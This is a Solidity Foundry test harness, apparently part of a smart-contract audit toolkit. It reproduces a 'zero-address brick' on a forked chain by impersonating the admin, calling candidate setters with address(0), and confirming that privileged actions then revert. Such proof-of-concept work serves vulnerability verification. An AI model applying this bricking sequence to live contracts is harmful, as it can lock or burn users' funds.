// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";

/// @title Fallback PoC -- Zero-address write bricks the contract
/// @notice Detector: zero-address. A privileged setter accepts address(0)
///         for a critical address (fee recipient, treasury, owner,
///         oracle). Once set, every payout / fee / price read that touches
///         the zero address reverts or burns funds -- the contract bricks.
/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via
///      scripts/run-fork-poc.sh. Pranks the admin: this proves the setter
///      LACKS a zero check (the check is the fix).
///
///      This harness does NOT guess a single entry point. It tries every
///      plausible setter and accepts the first that produces the class
///      OBSERVABLE -- the owner slot becomes ZERO and a subsequent
///      privileged action now REVERTS (the brick). A setter call that merely
///      RETURNS is never treated as a reproduction.

contract PoC is Test {
    address public target;
    uint256 public forkBlock;
    // The admin who can call the setter. Leave as 0 to auto-read owner().
    address public constant ADMIN = address(0);

    function setUp() public {
        target = vm.envOr("POC_TARGET", address(0));
        require(target != address(0), "POC_TARGET not set");
        forkBlock = vm.envOr("POC_FORK_BLOCK", uint256(0));
        string memory rpc = vm.envOr("POC_RPC_URL", string("mainnet"));
        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);
        vm.selectFork(forkId);
    }

    function test_forkSanity() public {
        assertGt(target.code.length, 0, "target has no code at this fork block");
    }

    function _readOwner() internal view returns (bool found, address owner_) {
        (bool ok, bytes memory ret) = target.staticcall(abi.encodeWithSignature("owner()"));
        if (ok && ret.length == 32) return (true, abi.decode(ret, (address)));
        return (false, address(0));
    }

    function _ownerSlot() internal view returns (uint256) {
        return uint256(vm.load(target, bytes32(uint256(0))));
    }

    /// Try ONE candidate setter and accept it only when the class OBSERVABLE
    /// changes -- never because the call returned.
    /// `before` is the owner-slot value snapshot.
    function _attempt(address attacker, uint256 before, string memory label, bytes memory data)
        internal
        returns (string memory)
    {
        vm.prank(attacker);
        (bool ok,) = target.call(data);
        uint256 slotNow = _ownerSlot();
        console.log("tried", label, ok ? "call returned" : "call reverted");
        // OBSERVABLE (zero-address brick): the owner slot is now ZERO, and was
        // not before. A setter call that merely returned is not the brick.
        if (ok && before != 0 && slotNow == 0) return label;
        return "";
    }

    function _tryEntry(address attacker, uint256 before) internal returns (string memory used) {
        used = _attempt(
            attacker, before, "setOwner(address)", abi.encodeWithSignature("setOwner(address)", address(0))
        );
        if (bytes(used).length > 0) return used;
        used = _attempt(
            attacker,
            before,
            "transferOwnership(address)",
            abi.encodeWithSignature("transferOwnership(address)", address(0))
        );
        if (bytes(used).length > 0) return used;
        used = _attempt(
            attacker, before, "set(address)", abi.encodeWithSignature("set(address)", address(0))
        );
        if (bytes(used).length > 0) return used;
        used = _attempt(
            attacker, before, "update(address)", abi.encodeWithSignature("update(address)", address(0))
        );
        if (bytes(used).length > 0) return used;
        used = _attempt(
            attacker,
            before,
            "setFeeTo(address)",
            abi.encodeWithSignature("setFeeTo(address)", address(0))
        );
        if (bytes(used).length > 0) return used;
        return "";
    }

    /// Corroboration of the brick: with the owner slot zeroed, a privileged
    /// action that the admin could take must now REVERT.
    function _privilegedActionReverts(address attacker) internal returns (bool) {
        bytes[4] memory actions;
        actions[0] = abi.encodeWithSignature("withdraw()");
        actions[1] = abi.encodeWithSignature("sweep()");
        actions[2] = abi.encodeWithSignature("pause()");
        actions[3] = abi.encodeWithSignature("mint(address,uint256)", attacker, uint256(1 ether));
        for (uint256 i = 0; i < actions.length; i++) {
            vm.prank(attacker);
            (bool ok,) = target.call(actions[i]);
            if (!ok) return true;
        }
        return false;
    }

    function test_exploit() public {
        address admin = ADMIN;
        if (admin == address(0)) {
            (bool found, address owner_) = _readOwner();
            require(found, "set ADMIN to the account that can call the setter");
            admin = owner_;
        }

        // OBSERVABLE snapshot: the owner slot.
        uint256 before = _ownerSlot();

        string memory used = _tryEntry(admin, before);

        assertTrue(
            bytes(used).length > 0,
            "not reproduced via any tried entry point. Candidates tried: setOwner(address), transferOwnership(address), set(address), update(address), setFeeTo(address) -- each either REVERTED (a zero check is present) or RETURNED without zeroing the owner slot. This does NOT establish safety: the setter may be under another name. Adapt the candidate list."
        );
        assertTrue(
            _privilegedActionReverts(admin),
            "owner slot zeroed but a privileged action still succeeds -- not bricked"
        );
        console.log("zero-address brick reproduced via", used, "-- owner slot is now 0");
    }
}
